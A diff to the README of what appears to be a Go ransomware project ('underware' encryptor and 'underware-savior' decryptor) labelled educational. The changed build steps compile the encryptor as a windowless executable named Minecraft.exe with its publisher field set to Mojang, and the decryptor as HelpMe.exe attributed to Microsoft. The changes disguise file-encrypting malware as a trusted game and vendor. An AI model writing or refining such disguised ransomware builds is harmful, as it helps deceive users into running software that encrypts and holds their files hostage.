@@ -66,12 +66,13 @@ This project is intended for **educational purposes only** to help understand th
 2. Build the encryptor:
    ```bash
    cd underware
-   go build -ldflags="-H windowsgui" -o minecraft.exe
+   go build -ldflags="-H windowsgui" -o encryptor.exe
+   go build -ldflags="-H windowsgui" -ldflags "-X main.Publisher=Mojang" -o Minecraft.exe
    ```
 2. Build the decryptor:
    ```bash
    cd underware-savior
-   go build -o decryptor.exe
+   go build -ldflags="-H windowsgui" -ldflags "-X main.Publisher=Microsoft" -o HelpMe.exe
    ```
 
 
